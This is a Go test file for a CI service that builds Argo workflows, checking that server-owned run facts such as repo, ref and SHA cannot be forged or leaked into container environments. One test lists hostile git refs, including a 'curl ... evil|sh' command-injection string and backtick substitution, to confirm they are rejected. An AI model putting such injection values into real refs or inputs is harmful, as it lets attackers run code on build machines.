package argojob

import (
	"encoding/json"
	"reflect"
	"strings"
	"testing"

	wfv1 "github.com/argoproj/argo-workflows/v4/pkg/apis/workflow/v1alpha1"
	corev1 "k8s.io/api/core/v1"

	"github.com/oberthci/oberth/internal/model"
	"github.com/oberthci/oberth/pkg/argoworkflow"
	"github.com/oberthci/oberth/pkg/pipeline"
)

func runFacts(t *testing.T, workflow *wfv1.Workflow) map[string]string {
	t.Helper()
	values := map[string]string{}
	for _, p := range workflow.Spec.Arguments.Parameters {
		if _, duplicate := values[p.Name]; duplicate || p.Value == nil || p.ValueFrom != nil || p.Default != nil || len(p.Enum) != 0 {
			t.Fatalf("unexpected compiled parameter: %+v", p)
		}
		values[p.Name] = p.Value.String()
	}
	return values
}

func TestBuildRunFactsAreNativeWorkflowParameters(t *testing.T) {
	for _, scenario := range []struct {
		name    string
		tier    pipeline.Trigger
		trigger argoworkflow.RunTrigger
		assist  bool
	}{
		{"push", pipeline.TriggerCI, argoworkflow.RunTriggerBranch, false},
		{"release", pipeline.TriggerRelease, argoworkflow.RunTriggerTag, false},
		{"schedule", pipeline.TriggerCI, argoworkflow.RunTriggerSchedule, false},
		{"assist", pipeline.TriggerCI, argoworkflow.RunTriggerBranch, true},
		{"promotion", pipeline.TriggerCI, argoworkflow.RunTriggerPromotion, false},
		{"ordinary tag", pipeline.TriggerCI, argoworkflow.RunTriggerTag, false},
	} {
		t.Run(scenario.name, func(t *testing.T) {
			request := assistRequest(scenario.tier, assistDocument)
			request.RunTrigger, request.Assist = scenario.trigger, scenario.assist
			if scenario.trigger == argoworkflow.RunTriggerTag {
				request.Ref = "refs/tags/v1.2.3"
			}
			workflow, err := Build(assistConfig(), request)
			if err != nil {
				t.Fatal(err)
			}
			want := map[string]string{
				"oberth-repo": request.Repo, "oberth-ref": request.Ref, "oberth-sha": request.SHA,
				argoworkflow.TriggerParameter: string(scenario.trigger),
			}
			if scenario.tier == pipeline.TriggerRelease {
				want["oberth-release-tag"], want["oberth-release-sha"] = request.Ref, request.SHA
			}
			if got := runFacts(t, workflow); !reflect.DeepEqual(got, want) {
				t.Fatalf("facts = %v, want %v", got, want)
			}
			if workflow.Name != request.Name || workflow.Labels[runLabel] != request.RunID || workflow.Labels["oberth.ci/sha"] != request.SHA || workflow.Labels[triggerLabel] != string(request.Trigger) || workflow.Labels[tierLabel] == "" || workflow.Labels["oberth.ci/repo"] != request.Repo {
				t.Fatalf("run name or labels changed: %+v", workflow.ObjectMeta)
			}
			// These live mechanism variables remain with the workspace/toolchain,
			// collector, assist and secret-store owners. No run-fact env is authored.
			allowed := map[string]bool{"OBERTH_TOOLS_DIR": true, "OBERTH_CACHE_DIR": true, "OBERTH_ARTIFACTS": true, AssistHoldEnv: true, "OBERTH_VAULT_ROLE": true, "OBERTH_RELEASE_WIF": true}
			walkTemplates(workflow, func(template *wfv1.Template) {
				templateContainers(template, func(container *corev1.Container) {
					for _, env := range container.Env {
						if strings.HasPrefix(env.Name, "OBERTH_") && !allowed[env.Name] {
							t.Errorf("%s/%s received %s", template.Name, container.Name, env.Name)
						}
					}
				})
			})
		})
	}
}

func TestReleaseFactParametersPreserveEmptyValues(t *testing.T) {
	workflow := &wfv1.Workflow{}
	setRunFactParameters(workflow, Request{Trigger: pipeline.TriggerRelease})
	facts := runFacts(t, workflow)
	for _, name := range []string{"oberth-release-tag", "oberth-release-sha"} {
		if value, present := facts[name]; !present || value != "" {
			t.Fatalf("%s = %q, present %v", name, value, present)
		}
	}
}

func TestBuildPreservesAuthoredSHAEnvironment(t *testing.T) {
	source := strings.Replace(greedyDocument, "name: OBERTH_TRIGGER\n            value: release", "name: OBERTH_SHA\n            value: authored-sha", 1)
	workflow, err := Build(testConfig(), testRequest(pipeline.TriggerCI, source))
	if err != nil {
		t.Fatal(err)
	}
	if got := environmentOf(t, workflow, "main")["OBERTH_SHA"]; got != "authored-sha" {
		t.Fatalf("authored env = %q", got)
	}
	if got := runFacts(t, workflow)["oberth-sha"]; got != testSHA {
		t.Fatalf("server fact = %q", got)
	}
}

func TestBuildRefusesAuthoredRunFactParameters(t *testing.T) {
	source := strings.Replace(greedyDocument, "spec:\n", "spec:\n  arguments:\n    parameters:\n    - name: oberth-sha\n      value: forged\n", 1)
	if _, err := Build(testConfig(), testRequest(pipeline.TriggerCI, source)); err == nil || !strings.Contains(err.Error(), "server-owned") {
		t.Fatalf("authored server fact: %v", err)
	}
}

func TestBuildRunFactEnvironmentAbsentFromEveryContainerShape(t *testing.T) {
	authored, err := argoworkflow.Decode([]byte(guardedDocument))
	if err != nil {
		t.Fatal(err)
	}
	leaf := authored.Spec.Templates[1].DeepCopy()
	leaf.Name = "container"
	leaf.InitContainers = []wfv1.UserContainer{{Container: *leaf.Container.DeepCopy()}}
	leaf.InitContainers[0].Name = "authored-init"
	leaf.Sidecars = []wfv1.UserContainer{{Container: *leaf.Container.DeepCopy()}}
	leaf.Sidecars[0].Name = "authored-sidecar"
	script := wfv1.Template{Name: "script", Script: &wfv1.ScriptTemplate{Container: *leaf.Container.DeepCopy(), Source: "true"}}
	set := wfv1.Template{Name: "set", ContainerSet: &wfv1.ContainerSetTemplate{Containers: []wfv1.ContainerNode{{Container: *leaf.Container.DeepCopy()}}}}
	set.ContainerSet.Containers[0].Name = "main"
	inline := leaf.DeepCopy()
	inline.Name = "inline"
	authored.Spec.Templates = []wfv1.Template{
		{Name: "main", DAG: &wfv1.DAGTemplate{Tasks: []wfv1.DAGTask{
			{Name: "container", Template: "container"}, {Name: "script", Template: "script"}, {Name: "set", Template: "set"},
			{Name: "inline", Inline: inline}, {Name: "steps", Template: "steps"},
		}}},
		*leaf, script, set,
		{Name: "steps", Steps: []wfv1.ParallelSteps{{Steps: []wfv1.WorkflowStep{{Name: "nested", Inline: inline.DeepCopy()}}}}},
	}
	source, err := json.Marshal(authored)
	if err != nil {
		t.Fatal(err)
	}
	request := testRequest(pipeline.TriggerCI, "")
	request.Source = source
	workflow, err := Build(testConfig(), request)
	if err != nil {
		t.Fatal(err)
	}
	visited := 0
	walkTemplates(workflow, func(template *wfv1.Template) {
		templateContainers(template, func(container *corev1.Container) {
			visited++
			for _, env := range container.Env {
				switch env.Name {
				case "OBERTH_REPO", "OBERTH_REF", "OBERTH_SHA", "OBERTH_TRIGGER", "OBERTH_RUN_ID", "OBERTH_RELEASE_TAG", "OBERTH_RELEASE_SHA", "OBERTH_STEP":
					t.Errorf("%s/%s received %s", template.Name, container.Name, env.Name)
				}
			}
		})
	})
	if visited < 11 {
		t.Fatalf("visited only %d containers", visited)
	}
}

func TestBuildRejectsUnsafeRunRefs(t *testing.T) {
	for _, ref := range []string{"v9.9.9;curl${IFS}evil|sh", "refs/heads/topic{{workflow.parameters.x}}", "topic`id`"} {
		for _, tier := range []pipeline.Trigger{pipeline.TriggerCI, pipeline.TriggerRelease} {
			t.Run(string(tier)+"/"+ref, func(t *testing.T) {
				request := testRequest(tier, greedyDocument)
				request.Ref = ref // Also represents an already-stored run or mirrored ref.
				_, err := Build(testConfig(), request)
				want := model.ValidateRunRef(ref)
				if want == nil {
					t.Fatal("hostile ref accepted by shared validation")
				}
				if err == nil || err.Error() != want.Error() {
					t.Fatalf("Build = %v, want identical receive refusal %q", err, want)
				}
			})
		}
	}
}

func TestRunFactParametersReplaceDuplicates(t *testing.T) {
	workflow := &wfv1.Workflow{Spec: wfv1.WorkflowSpec{Arguments: wfv1.Arguments{Parameters: []wfv1.Parameter{
		{Name: "other", Value: wfv1.AnyStringPtr("kept")},
		{Name: "oberth-repo", Value: wfv1.AnyStringPtr("stale")},
		{Name: "oberth-sha", ValueFrom: &wfv1.ValueFrom{Parameter: "forged"}},
		{Name: "oberth-sha", Default: wfv1.AnyStringPtr("forged")},
		{Name: "oberth-release-tag", Value: wfv1.AnyStringPtr("stale")},
	}}}}
	request := testRequest(pipeline.TriggerRelease, greedyDocument)
	setRunFactParameters(workflow, request)
	setRunFactParameters(workflow, request)
	want := map[string]string{"other": "kept", "oberth-repo": request.Repo, "oberth-ref": request.Ref, "oberth-sha": request.SHA, "oberth-release-tag": request.Ref, "oberth-release-sha": request.SHA}
	if got := runFacts(t, workflow); !reflect.DeepEqual(got, want) {
		t.Fatalf("replaced facts = %v", got)
	}
	request.Trigger = pipeline.TriggerCI
	setRunFactParameters(workflow, request)
	delete(want, "oberth-release-tag")
	delete(want, "oberth-release-sha")
	if got := runFacts(t, workflow); !reflect.DeepEqual(got, want) {
		t.Fatalf("CI facts = %v", got)
	}
}
